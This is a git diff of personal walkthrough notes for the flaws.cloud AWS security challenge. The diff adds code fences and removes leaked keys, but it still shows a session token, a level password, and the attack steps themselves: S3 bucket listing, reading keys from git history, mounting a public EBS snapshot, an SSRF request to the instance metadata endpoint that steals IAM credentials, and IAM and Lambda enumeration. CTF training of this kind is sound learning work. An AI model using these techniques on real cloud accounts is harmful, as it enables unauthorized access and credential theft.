@@ -3,32 +3,35 @@ My notes for http://flaws.cloud
 Level 1
 -------
 
+```
 dig flaws.cloud
 nslookup 52.218.224.202
 curl 'flaws.cloud.s3.amazonaws.com/'
+```
 
 Level 2
 -------
 
+```
 http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
 aws configure
 aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+```
 
 Level 3
 -------
 
+```
 http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
 mkdir level3-flaws
 cd level3-flaws
 aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .
 git diff HEAD^
-
-access_key AKIAJ366LIPB4IJKT7SA
-secret_access_key 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
-
 aws configure --profile flaws
 aws s3api list-buckets --profile flaws
+```
 
+```
 {
     "Buckets": [
         {
@@ -77,16 +80,24 @@ aws s3api list-buckets --profile flaws
         "ID": "d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73"
     }
 }
+```
 
 Level 4
 -------
 
+```
 aws iam get-user --profile flaws
+```
 
+```
 User: arn:aws:iam::975426262029:user/backup
+```
 
+```
 aws ec2 describe-snapshots --profile flaws --region us-west-2 --owner-ids 975426262029
+```
 
+```
 {
     "Snapshots": [
         {
@@ -108,18 +119,21 @@ aws ec2 describe-snapshots --profile flaws --region us-west-2 --owner-ids 975426
         }
     ]
 }
+```
 
+```
 aws ec2 copy-snapshot --region us-west-2 --source-region us-west-2 --source-snapshot-id snap-0b49342abd1bdcb89
+```
 
 https://us-west-2.console.aws.amazon.com/ec2/v2/home?region=us-west-2#Snapshots:sort=snapshotId
 
 Create instance and attach volume
 
+```
 sudo mount /dev/xvdf1 /mnt
-
 ls /mnt/home/ubuntu
+```
 
-http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/
 flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
 
 Level 5
@@ -129,6 +143,7 @@ http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
 
 http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
 
+```
 {
   "Code" : "Success",
   "LastUpdated" : "2019-06-14T16:27:33Z",
@@ -138,21 +153,29 @@ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.25
   "Token" : "AgoJb3JpZ2luX2VjEMn//////////wEaCXVzLXdlc3QtMiJIMEYCIQD1TW52LJJuQG9JR0jukvkuePJ86KJYqcmVlNt+meO91QIhAKKmUmn8DEQdEdtEQkH+PStRIhs0ekEsCIDL/oGtrmSjKuMDCPL//////////wEQABoMOTc1NDI2MjYyMDI5IgwGkZ9AIVbKIZgt+CoqtwOTyrkWeR/eLxvhLM3VFVdIyT6Ctv0pl+zRs4G1vta5ez3vaN59URUYoCgdBJBh8hZ3qqwsS+nD3SWtc57pq4Eo9CqU1dEkRUwvOgpcOaFK9z+RB3gRfycoTuLVbg4w2qDW3CxRXXl1H1I1zXmNkMtfyhtgVd7FVOV06I6cku/NWE0DnsWSA18H5feZ6Cr5MmRkeRnnje/8vXG9PXaZ4EeuW6s2nbz3LTc6sroy62ESm/HmT6VG0us+zTdN3el+XJB0+3hTxQ05+Z/UIp5pk2vLYjiMtfx3P7XVwLx18YyZDjtEoAbXeWOdZyJ5/Wb+I1TCGNAxpLoH8TYptktbLcpIxy68WeIl+lX61mfXwKYZhjBQEZ3yZ+eue5964Azyyh/360IVR8+ghR9Wgt1pbMg02uZ7HS74MlZU09Bz2UXFjpdo1JZeK2aMSTVy/1GLENjZ62fm1Jc36s/TuqE/dUvZpkv70e2afqxb5mS8I6aL9hKN9bPlR5FUvHFQNy6jnAz4Rlkgy7DgV38YuAGKOEu/3LcV+foU8+SU0PAu7Eb2qreQFuxQ45spWA4uB5ia0JKgTRyxC5RSMMaVj+gFOrMBFm7A/GPppqvwTHRsre+fM3AYWmXbgr9xsw3ynJlFAXnHI2xTFd6zr47b0/Hv04UTEl0e/2TqXVuDePCnOjhD1vglDnlgX1n8mHop8KzWxbOWuxMSJgnIpKGmXln0qoZHaRX/5L2/pQk6MNBJROUYGtsy0m+kFpRmj1R+PrN2G60WHHd9aCjYejPlS5/9PwP1e1hbT52Yl1zOCpFwq5ZgUBQfmHCqfX8lTTv9NXQZNvsaHMs=",
   "Expiration" : "2019-06-14T22:58:15Z"
 }
+```
 
+```
 [flaws]
-aws_access_key_id = ASIA6GG7PSQG6JI2QJ5Z
-aws_secret_access_key = zJRqHVWct/BWVZCgGAS2/2D2DCbeB7hc0hPBPUz1
-aws_session_token = AgoJb3JpZ2luX2VjEMn//////////wEaCXVzLXdlc3QtMiJIMEYCIQD1TW52LJJuQG9JR0jukvkuePJ86KJYqcmVlNt+meO91QIhAKKmUmn8DEQdEdtEQkH+PStRIhs0ekEsCIDL/oGtrmSjKuMDCPL//////////wEQABoMOTc1NDI2MjYyMDI5IgwGkZ9AIVbKIZgt+CoqtwOTyrkWeR/eLxvhLM3VFVdIyT6Ctv0pl+zRs4G1vta5ez3vaN59URUYoCgdBJBh8hZ3qqwsS+nD3SWtc57pq4Eo9CqU1dEkRUwvOgpcOaFK9z+RB3gRfycoTuLVbg4w2qDW3CxRXXl1H1I1zXmNkMtfyhtgVd7FVOV06I6cku/NWE0DnsWSA18H5feZ6Cr5MmRkeRnnje/8vXG9PXaZ4EeuW6s2nbz3LTc6sroy62ESm/HmT6VG0us+zTdN3el+XJB0+3hTxQ05+Z/UIp5pk2vLYjiMtfx3P7XVwLx18YyZDjtEoAbXeWOdZyJ5/Wb+I1TCGNAxpLoH8TYptktbLcpIxy68WeIl+lX61mfXwKYZhjBQEZ3yZ+eue5964Azyyh/360IVR8+ghR9Wgt1pbMg02uZ7HS74MlZU09Bz2UXFjpdo1JZeK2aMSTVy/1GLENjZ62fm1Jc36s/TuqE/dUvZpkv70e2afqxb5mS8I6aL9hKN9bPlR5FUvHFQNy6jnAz4Rlkgy7DgV38YuAGKOEu/3LcV+foU8+SU0PAu7Eb2qreQFuxQ45spWA4uB5ia0JKgTRyxC5RSMMaVj+gFOrMBFm7A/GPppqvwTHRsre+fM3AYWmXbgr9xsw3ynJlFAXnHI2xTFd6zr47b0/Hv04UTEl0e/2TqXVuDePCnOjhD1vglDnlgX1n8mHop8KzWxbOWuxMSJgnIpKGmXln0qoZHaRX/5L2/pQk6MNBJROUYGtsy0m+kFpRmj1R+PrN2G60WHHd9aCjYejPlS5/9PwP1e1hbT52Yl1zOCpFwq5ZgUBQfmHCqfX8lTTv9NXQZNvsaHMs=
+aws_access_key_id = 
+aws_secret_access_key = 
+aws_session_token = 
+```
 
+```
 aws s3 ls --profile flaws level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+```
 
 Level 6
 -------
 
 http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
 
+```
 aws --profile flaws --region us-west-2 logs describe-log-groups
+```
 
+```
 {
     "logGroups": [
         {
@@ -178,11 +201,15 @@ aws --profile flaws --region us-west-2 logs describe-log-groups
         }
     ]
 }
+```
 
+```
 aws --profile flaws --region us-west-2 logs describe-log-streams --log-group-name "/aws/lambda/Level6"
 aws --profile flaws --region us-west-2 logs describe-log-streams --log-group-name "/aws/lambda/level6-0eb39b080b772f3cc1ee4b51ef790f376b482c33"
-
 aws --profile flaws iam get-user
+```
+
+```
 {
     "User": {
         "Path": "/",
@@ -192,9 +219,13 @@ aws --profile flaws iam get-user
         "CreateDate": "2017-02-26T23:11:16Z"
     }
 }
+```
 
+```
 aws --profile flaws iam list-attached-user-policies --user-name Level6
+```
 
+```
 {
     "AttachedPolicies": [
         {
@@ -207,9 +238,13 @@ aws --profile flaws iam list-attached-user-policies --user-name Level6
         }
     ]
 }
+```
 
+```
 aws --profile flaws iam get-policy --policy-arn "arn:aws:iam::975426262029:policy/list_apigateways"
+```
 
+```
 {
     "Policy": {
         "PolicyName": "list_apigateways",
@@ -225,9 +260,13 @@ aws --profile flaws iam get-policy --policy-arn "arn:aws:iam::975426262029:polic
         "UpdateDate": "2017-02-20T01:48:17Z"
     }
 }
+```
 
+```
 aws --profile flaws iam get-policy-version --policy-arn "arn:aws:iam::975426262029:policy/list_apigateways" --version-id "v4"
+```
 
+```
 {
     "PolicyVersion": {
         "Document": {
@@ -247,12 +286,21 @@ aws --profile flaws iam get-policy-version --policy-arn "arn:aws:iam::9754262620
         "CreateDate": "2017-02-20T01:48:17Z"
     }
 }
+```
 
+```
 aws --profile flaws --region us-west-2 apigateway get-rest-apis
+```
 
+```
 An error occurred (AccessDeniedException) when calling the GetRestApis operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: apigateway:GET on resource: arn:aws:apigateway:us-west-2::/restapis
+```
 
+```
 aws --profile flaws --region us-west-2 lambda list-functions
+```
+
+```
 {
     "Functions": [
         {
@@ -275,14 +323,24 @@ aws --profile flaws --region us-west-2 lambda list-functions
         }
     ]
 }
+```
 
+```
 aws --profile flaws --region us-west-2 lambda get-policy --function-name Level6
+```
+
+```
 {
     "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
     "RevisionId": "22f08307-9080-4403-bf4d-481ddc8dcb89"
 }
+```
 
+```
 aws --profile flaws --region us-west-2 apigateway get-rest-api --rest-api-id s33ppypa75
+```
+
+```
 {
     "id": "s33ppypa75",
     "name": "Level6",
@@ -295,8 +353,13 @@ aws --profile flaws --region us-west-2 apigateway get-rest-api --rest-api-id s33
     },
     "tags": {}
 }
+```
 
+```
 aws --profile flaws --region us-west-2 apigateway get-stages --rest-api-id s33ppypa75
+```
+
+```
 {
     "item": [
         {
@@ -311,6 +374,7 @@ aws --profile flaws --region us-west-2 apigateway get-stages --rest-api-id s33pp
         }
     ]
 }
+```
 
 https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
 
